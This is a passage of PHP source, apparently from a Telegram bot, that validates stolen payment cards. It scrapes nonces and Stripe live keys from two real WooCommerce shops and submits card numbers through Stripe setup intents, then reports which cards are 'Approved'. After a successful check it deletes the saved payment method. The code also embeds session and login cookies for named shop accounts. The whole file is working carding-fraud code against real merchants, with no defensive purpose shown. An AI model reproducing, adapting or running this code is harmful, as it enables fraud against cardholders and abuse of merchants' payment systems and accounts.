MzFIWEJ5REVsd0FOVXBGa3BtTzBFMTUzVEZXbHpRVHZYU3Jhb3Q4ays4V0VieWhDc2c4S2NiYWZKZHI0MWNzSHlJbGZKNm9GOXV2b1V4bWF1S2RYUURxRU5PbGpRN1FaSWVrOThOZ1p5OGJhbFRNVVlnUitnc2d1Y1lkdWJqSHYvSEYvS3BNaXBqN3g2eEFRZGM2bXpoenBmTHRTbjZQV0RFN1N1U1cwYnc2UzZ4NEFDK0lrSjdQcllkcUJvK3d2dnhNTzBrVm82aWxPdmVUUVNIVzVRcERtNk1kSkFqWEk2RFNrbXZYcXZGcGJSc2UxbVRBYjNJbGRiZGI5Ykh1K3V3QXo5T3pCeEFlbWdZdHhoOEtjUjZZYXpRTTlCOVpXM0ZwczZNRXcrRU5UbitOTmVrTjFseFBiSUVYY0hIY2JsZVJOUnhnNVdhL3RSc0FCUCtCVWN0djVXWW9qV2IzaXpJOHZ2VWtUTzhId3hnaFlVUGpLcnM5OGltRHh5RzM1aldpemFHOFRrd202Sm1mZFF6Qm82Rm8rNnJOL2ZsOVZ4bmJkMnhkZ3B0aHFRZXNYeS9ERHVNSjJOQnlRcFU0Z2tldmtobWRNYnNycm1sdmVZbzEwQmxkL2tkMEU3NW0vVFAxMm9Ob1I4UnRscEcwN2RPN2tvZ3lEb29BMlNkQUlPc3hrT2dicVBBb0dSSkE1aUh2UmVFZUZDZStNcWVBSmdCNisyc3dsZ3hoWldCb0VjS2hTTGRBUXlqREVXS3dHQ2VwZm9YL3lqcE85cjljZEcrTXRjY2JwQ2JtL3lpdXM4dHVTR2srSEVMNTY5ZXB5Rm9hTVdUZEYzbkJBWWhmMG1LWS9UYTNURHFTN0hSaGxJNUUzSC9TejhKSkxHN0Q4QzlBcm9HMWZReGcxbWZLaXBJbnVLN0prQ1FURUd4bVZGWXE4UzdETTdwQ2RGYjg1dzlBVUl2c3FFczBJU2c5YlhrRzIrdFpBMm51ZlBONlNzWHB3Rmh6N1k1TC85UWlBMm5VPSIsImV4cCI6MTc0MTg4NTgxMiwic2hhcmRfaWQiOjIyMTk5NjA3Mywia3IiOiIxMDU2ZjA3MSIsInBkIjowLCJjZGF0YSI6InpyM25DY3dyMHFGZVByYWJISFJHaFQ2SlR3N1FFS2VUYS9pTzVHUyttdHg4VFc4eGNad2s2MTk5cXNubU1EZnRvUjJIbnA1aFdoamNuZ296Zi9hVWF0Y2tNZnJBaHYxdTFuVjVXOU9JOUVhNURWNDRKOTVHZHlHNFc0c2RrdDYxZm1NT0YyejdtZzl3WlBiUmY1TUt4NXJPUUI3VXNyYUcxdWJudnN6UVdLTTVaVjg3UW4xTDg0aEUvNHovUTMrSnQ1aWhsSEdFWS8rM3BKRXMifQ.WJqabVddYBINxRZM2XnLETh1nA4YgYHJRMSdkFzzC18',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'accept-language: es-US,es;q=0.7',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);

$response = curl_exec($curl);
$json = json_decode($response, true);
$id = $json["id"];
curl_close($curl);
echo "$id\n";




$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://stainlessnutsandbolts.co.uk/wp-admin/admin-ajax.php',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => [
    'action' => 'create_setup_intent',
    'wcpay-payment-method' => ''.$id.'',
    '_ajax_nonce' => ''.$nonce.'',
  ],
  CURLOPT_COOKIE => 'wordpress_sec_3dc49451096e94637e98b7d302410bbe=tataji3523%7C1743095179%7C6ykFKTmQOiQ8TVaZQ08uhYAymLk9M7zTVate4fls0E3%7C4d04ba1c80d1fb76591327d6f56bb7ad385e7a75384526499dacb690aabc850e; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-03-13%2017%3A06%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fstainlessnutsandbolts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-03-13%2017%3A06%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fstainlessnutsandbolts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F134.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_3dc49451096e94637e98b7d302410bbe=tataji3523%7C1743095179%7C6ykFKTmQOiQ8TVaZQ08uhYAymLk9M7zTVate4fls0E3%7C3800628016aa866c6fcc02818d9bc626224a03f58f175ef9036dd2b3b063bdc6; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fstainlessnutsandbolts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
//    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryDRNCeIhrpZ14Xo0P',
    'accept-language: es-US,es;q=0.7',
    'origin: https://stainlessnutsandbolts.co.uk',
    'referer: https://stainlessnutsandbolts.co.uk/my-account/add-payment-method/',
    'priority: u=1, i',
  ],
]);
	
$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$message = str_replace("Error: ", "", $json['data']['error']['message']);
$success = $json['success'];
$status = $json['data']['status'];
curl_close($curl);

if ($success === true && $status === "succeeded") {
    $respo = "1000: Approved!";

} elseif ($success === true && $status === "requires_action") {
    $respo = "3DS Authenticate Rejected ❌";
} else {
    $respo = $message;
}



$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";



if (empty($respo)) {
        $respo = $response;
}

if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Stripe Auth\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Stripe Auth\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Stripe Auth\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}


if ($live) {
    editMessage($chatId, $respuesta, $id_text);
} else {
    editMessage($chatId, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}
	



	
	
if (preg_match('/^(!|\/|\.)wo/', $message)) {
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = trim(substr($i[2], -2));
$cvv   = $i[3];

$lista = "$cc|$mes|$ano|cvv";


$bin = substr($lista, 0, 6);
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//


//Verifi//
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /wo CC|MM|YYYY|CVV\n";
    sendMessage($chatId, $respuesta, $message_id);
    die();
}



//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chatId,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

$longitud = 4;
$partes = [];
for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
}

////EXTRAE EL NONCE////
$cc = implode('+', $partes);


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.hollywoodexpendables.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=e8840e00-a679-4d73-8457-4388262e24a5a397d3; __stripe_sid=aec8464c-ef94-48a8-baa4-952f5c4f15f6b142ae; wordpress_logged_in_3efb2a5bb3559a2902dbffae45726d30=Rigo%20Lopez%7C1735501274%7CurxsLaoCkzeiZFLcKow3sfim63XiB9qRWQ4iSJosGTB%7Cb687215ea8543185629b3a86b2d8c90ecf663779dd5aef422d0930b53cee0454; wfwaf-authcookie-91172c47aa3700744a7ba5a826d5c151=2594%7Cother%7Cread%7Cf05fe5457117c7f43aedd2bdf4efb34bfed800301389cb5bd3ff347098c13c5b; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'cache-control: max-age=0',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.8',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-dest: document',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'referer: https://www.hollywoodexpendables.com/my-account/add-payment-method/',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/createAndConfirmSetupIntentNonce":"([a-zA-Z0-9]+)"/';
preg_match($patron, $response, $coincidencias);
$nonce = $coincidencias[1];
/////
$patron = '/pk_live_[a-zA-Z0-9]*/';
preg_match($patron, $response, $coincidencia);
$pk_live = $coincidencia[0];
curl_close($curl);

/////EXTRAE EL ID//

echo "$nonce\n";
echo "$pk_live\n";

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10010&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.hollywoodexpendables.com&time_on_page=47709&client_attribution_metadata%5Bclient_session_id%5D=555e488b-ae32-4b18-b81b-18fa0cb28a3f&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=842c073e-0d00-4a60-9629-653d2e680b0e2f7dcc&muid=e8840e00-a679-4d73-8457-4388262e24a5a397d3&sid=aec8464c-ef94-48a8-baa4-952f5c4f15f6b142ae&key=pk_live_3aQeYWJrvX0nCYSR0VstU8rL&_stripe_version=2024-06-20',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.8',
    'origin: https://js.stripe.com',
    'sec-fetch-site: same-site',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://js.stripe.com/',
    'priority: u=1, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
curl_close($curl);
echo "$id\n";
////HACE EL AUTH///


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.hollywoodexpendables.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=e8840e00-a679-4d73-8457-4388262e24a5a397d3; __stripe_sid=aec8464c-ef94-48a8-baa4-952f5c4f15f6b142ae; wordpress_logged_in_3efb2a5bb3559a2902dbffae45726d30=Rigo%20Lopez%7C1735501274%7CurxsLaoCkzeiZFLcKow3sfim63XiB9qRWQ4iSJosGTB%7Cb687215ea8543185629b3a86b2d8c90ecf663779dd5aef422d0930b53cee0454; wfwaf-authcookie-91172c47aa3700744a7ba5a826d5c151=2594%7Cother%7Cread%7Cf05fe5457117c7f43aedd2bdf4efb34bfed800301389cb5bd3ff347098c13c5b; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'x-requested-with: XMLHttpRequest',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'sec-ch-ua-mobile: ?1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.8',
    'origin: https://www.hollywoodexpendables.com',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://www.hollywoodexpendables.com/my-account/add-payment-method/',
    'priority: u=1, i',
  ],
]);
	
$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$message = str_replace("Error: ", "", $json['data']['error']['message']);
$success = $json['success'];
$status = $json['data']['status'];
curl_close($curl);

if ($success === true && $status === "succeeded") {
    $respo = "1000: Approved!";

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.hollywoodexpendables.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=e8840e00-a679-4d73-8457-4388262e24a5a397d3; __stripe_sid=aec8464c-ef94-48a8-baa4-952f5c4f15f6b142ae; wordpress_logged_in_3efb2a5bb3559a2902dbffae45726d30=Rigo%20Lopez%7C1735501274%7CurxsLaoCkzeiZFLcKow3sfim63XiB9qRWQ4iSJosGTB%7Cb687215ea8543185629b3a86b2d8c90ecf663779dd5aef422d0930b53cee0454; wfwaf-authcookie-91172c47aa3700744a7ba5a826d5c151=2594%7Cother%7Cread%7Cf05fe5457117c7f43aedd2bdf4efb34bfed800301389cb5bd3ff347098c13c5b; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'cache-control: max-age=0',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.8',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-dest: document',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'referer: https://www.hollywoodexpendables.com/my-account/add-payment-method/',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
preg_match($patron, $response, $coincidencias);
$url_nonce = $coincidencias[0];
curl_close($curl);

echo "$url_nonce\n";



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.hollywoodexpendables.com/my-account/delete-payment-method'.$url_nonce.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=e8840e00-a679-4d73-8457-4388262e24a5a397d3; __stripe_sid=aec8464c-ef94-48a8-baa4-952f5c4f15f6b142ae; wordpress_logged_in_3efb2a5bb3559a2902dbffae45726d30=Rigo%20Lopez%7C1735501274%7CurxsLaoCkzeiZFLcKow3sfim63XiB9qRWQ4iSJosGTB%7Cb687215ea8543185629b3a86b2d8c90ecf663779dd5aef422d0930b53cee0454; wfwaf-authcookie-91172c47aa3700744a7ba5a826d5c151=2594%7Cother%7Cread%7Cf05fe5457117c7f43aedd2bdf4efb34bfed800301389cb5bd3ff347098c13c5b; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.8',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'referer: https://www.hollywoodexpendables.com/my-account/payment-methods/',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

} elseif ($success === true && $status === "requires_action") {
    $respo = "3DS Authenticate Rejected ❌";
} else {
    $respo = $message;
}



$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
